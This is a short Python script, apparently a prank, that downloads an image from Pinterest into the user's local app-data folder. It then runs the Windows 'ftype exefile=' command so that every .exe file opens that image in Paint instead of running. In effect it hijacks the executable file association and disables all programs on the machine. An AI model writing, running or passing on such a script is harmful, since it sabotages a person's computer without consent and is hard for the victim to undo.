import os, urllib.request, subprocess

url = "https://i.pinimg.com/originals/b4/3c/6b/b43c6b6cd6f52cc56758aad9bfc56dfa.jpg"
path = os.environ["LOCALAPPDATA"] + "\\silly.jpg"
urllib.request.urlretrieve(url, path)

subprocess.run(rf'ftype exefile="C:\Windows\System32\mspaint.exe" "{path}"', shell=True)